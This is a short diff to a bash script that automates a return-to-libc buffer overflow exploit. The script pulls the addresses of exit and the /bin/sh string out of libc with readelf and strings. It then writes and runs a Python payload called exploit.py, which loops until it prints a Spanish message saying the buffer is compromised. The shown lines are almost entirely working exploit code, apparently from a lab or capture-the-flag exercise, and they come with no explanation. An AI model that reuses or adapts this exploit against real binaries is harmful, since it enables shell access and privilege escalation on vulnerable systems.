@@ -12,7 +12,7 @@ exit_mem=$(readelf -s "$which_lib" | grep " exit" | awk 'NF{print $2}' | sed 's/
 bash_mem=$(strings -a -t x "$which_lib" | grep /bin/sh | awk 'NF{print $1}' | sed 's/^0x//')
 
 pyload="exploit.py"
-cat > $python_script << EOF
+cat << EOF > $pyload
 #!/usr/bin/python3
 
 import subprocess
@@ -37,7 +37,6 @@ while True:
     if r.returncode == 0:
         print("\\n\\n[+] BUFFER COMPROMETIDO: Saliendo...")
         break
-
 EOF
 
 python3 $pyload
